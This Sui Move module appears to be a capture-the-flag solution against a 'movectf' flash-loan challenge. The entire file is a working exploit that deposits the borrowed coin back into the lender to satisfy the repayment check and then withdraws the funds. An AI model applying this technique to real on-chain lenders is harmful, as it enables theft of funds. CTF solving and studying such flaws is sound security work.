module flash_exploit::e {
    use sui::tx_context::TxContext;
    use movectf::flash::{FlashLender, loan, check, deposit, withdraw};

    public entry fun exploit(flash_lender: &mut FlashLender, ctx: &mut TxContext) {
        let amount = 1000;
        let (coin, receipt) = loan(flash_lender, amount, ctx);
        deposit(flash_lender, coin, ctx);
        check(flash_lender, receipt);
        withdraw(flash_lender, amount, ctx);
    }
}
